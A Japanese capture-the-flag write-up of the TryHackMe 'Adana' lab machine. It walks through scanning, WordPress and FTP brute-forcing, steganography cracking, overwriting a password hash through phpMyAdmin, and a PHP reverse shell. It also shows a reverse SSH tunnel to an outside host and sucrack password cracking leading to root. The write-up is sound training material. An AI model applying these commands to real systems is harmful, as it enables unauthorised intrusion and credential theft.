# Different CTF

https://tryhackme.com/room/adana

## Enumeration

```shell
TARGET=10.48.134.123
sudo bash -c "echo $TARGET   diff.thm  adana.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,80 $TARGET

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

FTP, HTTPのみ。FTPは匿名接続不可。

### ディレクトリ列挙

/announcements/ ディレクトリ発見。

ワードリストとJPGファイルをダウンロード。  
JPGに対して、stegseek, strings, exiftool をかけたが何も出なかった。

```sh
dirb http://$TARGET

---- Scanning URL: http://10.48.134.123/ ----
==> DIRECTORY: http://10.48.134.123/announcements/                                                                   
+ http://10.48.134.123/index.php (CODE:301|SIZE:0)                                                                   
==> DIRECTORY: http://10.48.134.123/javascript/                                                                      
==> DIRECTORY: http://10.48.134.123/phpmyadmin/                                                                      
+ http://10.48.134.123/server-status (CODE:403|SIZE:278)                                                             
==> DIRECTORY: http://10.48.134.123/wp-admin/                                                                        
==> DIRECTORY: http://10.48.134.123/wp-content/                                                                      
==> DIRECTORY: http://10.48.134.123/wp-includes/                                                                     
+ http://10.48.134.123/xmlrpc.php (CODE:405|SIZE:42)
```

### wpscan

hakanbey01 ユーザーのみ発見。

```sh
$ wpscan --url http://adana.thm/ -e

[i] User(s) Identified:

[+] hakanbey01
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://adana.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```

ワードリストを使ってブルートフォースをかけたが空振り。

```sh
wpscan --url http://adana.thm/ --passwords wordlist.txt --usernames hakanbey01
```

### ワードリスト

あとは、ワードリストを使えるとしたらFTPかJPG。

FTPは空振り。

```sh
hydra -l hakanbey01 -P wordlist.txt $TARGET ftp -t 30

root@ip-10-48-85-75:~# hydra -l hakanbey01 -P wordlist.txt $TARGET ftp -t 30
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-06 01:48:47
[DATA] max 30 tasks per 1 server, overall 30 tasks, 50000 login tries (l:1/p:50000), ~1667 tries per task
[DATA] attacking ftp://10.48.134.123:21/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-06 01:48:49
```

stegseek でワードリストを指定したらファイルが出てきた。

```sh
$ stegseek ./austrailian-bulldog-ant.jpg ./wordlist.txt 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "[REDACTED]"
[i] Original filename: "user-pass-ftp.txt".
[i] Extracting to "austrailian-bulldog-ant.jpg.out".
```

FTPの認証情報。

```sh
$ cat ./austrailian-bulldog-ant.jpg.out | base64 -d
FTP-LOGIN
USER: hakanftp
PASS: [REDACTED]
```

## FTP

```sh
ftp> ls -al
229 Entering Extended Passive Mode (|||55142|)
150 Here comes the directory listing.
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 .
drwxrwxrwx    8 1001     1001         4096 Jan 15  2021 ..
-rw-------    1 1001     1001           88 Jan 13  2021 .bash_history
drwx------    2 1001     1001         4096 Jan 11  2021 .cache
drwx------    3 1001     1001         4096 Jan 11  2021 .gnupg
-rw-r--r--    1 1001     1001          554 Jan 10  2021 .htaccess
drwxr-xr-x    2 0        0            4096 Jan 14  2021 announcements
-rw-r--r--    1 1001     1001          405 Feb 06  2020 index.php
-rw-r--r--    1 1001     1001        19915 Feb 12  2020 license.txt
-rw-r--r--    1 1001     1001         7278 Jun 26  2020 readme.html
-rw-r--r--    1 1001     1001         7101 Jul 28  2020 wp-activate.php
drwxr-xr-x    9 1001     1001         4096 Dec 08  2020 wp-admin
-rw-r--r--    1 1001     1001          351 Feb 06  2020 wp-blog-header.php
-rw-r--r--    1 1001     1001         2328 Oct 08  2020 wp-comments-post.php
-rw-r--r--    1 0        0            3194 Jan 11  2021 wp-config.php
drwxr-xr-x    4 1001     1001         4096 Dec 08  2020 wp-content
-rw-r--r--    1 1001     1001         3939 Jul 30  2020 wp-cron.php
drwxr-xr-x   25 1001     1001        12288 Dec 08  2020 wp-includes
-rw-r--r--    1 1001     1001         2496 Feb 06  2020 wp-links-opml.php
-rw-r--r--    1 1001     1001         3300 Feb 06  2020 wp-load.php
-rw-r--r--    1 1001     1001        49831 Nov 09  2020 wp-login.php
-rw-r--r--    1 1001     1001         8509 Apr 14  2020 wp-mail.php
-rw-r--r--    1 1001     1001        20975 Nov 12  2020 wp-settings.php
-rw-r--r--    1 1001     1001        31337 Sep 30  2020 wp-signup.php
-rw-r--r--    1 1001     1001         4747 Oct 08  2020 wp-trackback.php
-rw-r--r--    1 1001     1001         3236 Jun 08  2020 xmlrpc.php
226 Directory send OK.
```

wp-config.php

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'phpmyadmin1' );

/** MySQL database username */
define( 'DB_USER', 'phpmyadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', '[REDACTED]' );
```

/phpmyadmin にログインできた。

phpmyadmin1 DB からパスワードハッシュを取得。rockyou.txt でクラックできた。

```
hakanbey01
$P$BEy[REDACTED]
```

phpmyadmin DBはこれ（念のため取得）。こちらはクラックできなかった。wordlist.txt でも失敗。

```
hakanbey01
$P$BQML2QxAFBH4hb.qqKTpDnta6Q6Wl2/
```

## wordpress

入手した認証情報をWordPressログイン。・・・できるかと思ったが、エラー。

```
Error: The password you entered for the username hakanbey01 is incorrect.
```

実際に稼働しているのはFTPで見えているソースではなく、phpmyadmin DB を参照しているのではないかと想像する。

phpmyadmin DB のパスワードハッシュはクラックできなかったが、phpmyadmin1と同じハッシュ値に更新したらログインできるのでは？と考えた。

```sql
update wp_users set user_pass='$P$BEyLE[REDACTED]';
```

ログイン成功した。

Twenty Nineteen の 404テンプレートをリバースシェルに書き換えたかったが、ファイルに書き込みパーミッションが付いていないらしく、保存できなかった。

次にMediaアップロードを試みたが、これも書き込み権限がないため普通のファイルもアップロードできない。

## サブドメイン

phpmyadmin1 の wp_options にサブドメインが入っていた。hostsに追加。

FTPでアップロードしたPHPを実行してリバースシェル取得成功。

webフラグ発見。

```sh
www-data@ubuntu:/$ ls -al /var/www/html
total 236
drwxrwxrwx  6 root     root      4096 Feb  7 23:04 .
drwxrwxrwx  4 root     root      4096 Jan 14  2021 ..
-rw-r--r--  1 www-data www-data   523 Jan 10  2021 .htaccess
drwxr-xr-x  2 root     root      4096 Jan 11  2021 announcements
-rw-r--r--  1 root     root       405 Feb  6  2020 index.php
-rw-r--r--  1 root     root     19915 Feb 12  2020 license.txt
-rw-r--r--  1 root     root      7278 Jun 26  2020 readme.html
-rw-r--r--  1 root     root      7101 Jul 28  2020 wp-activate.php
drwxr-xr-x  9 root     root      4096 Dec  8  2020 wp-admin
-rw-r--r--  1 root     root       351 Feb  6  2020 wp-blog-header.php
-rw-r--r--  1 root     root      2328 Oct  8  2020 wp-comments-post.php
-rw-rw-rw-  1 www-data www-data  3193 Jan 10  2021 wp-config.php
drwxr-xr-x  4 root     root      4096 Dec  8  2020 wp-content
-rw-r--r--  1 root     root      3939 Jul 30  2020 wp-cron.php
drwxr-xr-x 25 root     root     12288 Dec  8  2020 wp-includes
-rw-r--r--  1 root     root      2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--  1 root     root      3300 Feb  6  2020 wp-load.php
-rw-r--r--  1 root     root     49831 Nov  9  2020 wp-login.php
-rw-r--r--  1 root     root      8509 Apr 14  2020 wp-mail.php
-rw-r--r--  1 root     root     20975 Nov 12  2020 wp-settings.php
-rw-r--r--  1 root     root     31337 Sep 30  2020 wp-signup.php
-rw-r--r--  1 root     root      4747 Oct  8  2020 wp-trackback.php
-rwxrwxrwx  1 hakanbey hakanbey    38 Jan 14  2021 [REDACTED].txt
-rw-r--r--  1 root     root      3236 Jun  8  2020 xmlrpc.php
```

## 権限昇格

hakanbey 関連のファイルを検索

```sh
www-data@ubuntu:/$ ls -Rl / 2>/dev/null | grep hakanbey 
drwxr-x--- 15 hakanbey hakanbey 4096 Mar 15  2021 hakanbey
-r-srwx--- 1 root   hakanbey    12984 Jan 14  2021 binary
-rwxr-x--- 1 root   hakanbey   238080 Nov  5  2017 find
-rw-r--r-- 1 root root 248 Jan 10  2021 hakanbey
drwxrwx--- 2 hakanbey lightdm 4096 Jan 10  2021 hakanbey
-rwxrwxrwx  1 hakanbey hakanbey    38 Jan 14  2021 wwe3bbfla4g.txt
```

ローカルでリッスンしているのは、22と631ポート。

```sh
www-data@ubuntu:/tmp$ ss -nltp
State                          Recv-Q                          Send-Q                                                     Local Address:Port                                                     Peer Address:Port                          
LISTEN                         0                               80                                                             127.0.0.1:3306                                                          0.0.0.0:*                             
LISTEN                         0                               128                                                        127.0.0.53%lo:53                                                            0.0.0.0:*                             
LISTEN                         0                               128                                                            127.0.0.1:22                                                            0.0.0.0:*                             
LISTEN                         0                               5                                                              127.0.0.1:631                                                           0.0.0.0:*                             
LISTEN                         0                               128                                                                    *:80                                                                  *:*                             
LISTEN                         0                               32                                                                     *:21                                                                  *:*                             
LISTEN                         0                               5                                                                  [::1]:631                                                              [::]:*
```

ここで行き詰ったのでウォークスルーを見た。

JPEGとFTPのパスワードが共通の文字列で始まるという類似性に注目する。  
この法則とワードリストを使い、SSHでブルートフォースを試みる。

SSHは開いていないのでトンネリングする必要がある。

```sh
www-data@ubuntu:/var/www/html$ ssh tunnel@192.168.129.39 -R 2222:localhost:22 -N
```

hydraを実行したが、時間がかかりすぎるため断念。

```sh
$ hydra -l hakanbey -P ./new_wordlist.txt localhost ssh -t 30 -s 2222
```

sucrack でブルートフォース成功。

```sh
www-data@ubuntu:/tmp$ dpkg -x ./sucrack.deb sucrack
www-data@ubuntu:/tmp$ chmod +x ./sucrack/usr/bin/sucrack 
www-data@ubuntu:/tmp$ ./sucrack/usr/bin/sucrack -w 100 -b 500 -u hakanbey ./new_wordlist.txt
```

## 権限昇格２

hakanbeyグループのバイナリが2つあり、binary はSUIDが付いている。

```sh
hakanftp@ubuntu:/$ ls -al /usr/bin | grep hakanbey
-r-srwx---  1 root   hakanbey    12984 Jan 14  2021 binary
-rwxr-x---  1 root   hakanbey   238080 Nov  5  2017 find
```

ghidraで解析してある文字列を入れたら root.jpg がコピーされた。  
表示したところルーム画像と同じ。（diffをとったらバイナリレベルでは異なる）

```sh
hakanbey@ubuntu:~$ binary
I think you should enter the correct string here ==>[REDACTED]
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
```

`From HEX, To Base85` というヒント？？？

hexeditor で画像を開き、`00000020` のアドレスの1行のHEX値をBase85デコードすると、rootの認証情報になった。

```sh
hakanbey@ubuntu:~$ su -
Password: 
root@ubuntu:~# 
```

## 振り返り

- サブドメインが気づきにくかったが、11万件のリストを使ってファジングしていたら早期に気づけていたと思われる。
- hakanbeyの昇格で、定期的に起動されるプロセスは無い、hakanbeyの常駐プロセスも無い、認証情報を入手して昇格するしかない、という予想まではできていたが、パスワードの法則性に気付けなかった。
- sucrack は知らなかったので勉強になった。
- debファイルをコピーして展開、実行する操作は参考になる。

## Tags

#tags:sucrack #tags:ステガノグラフィー
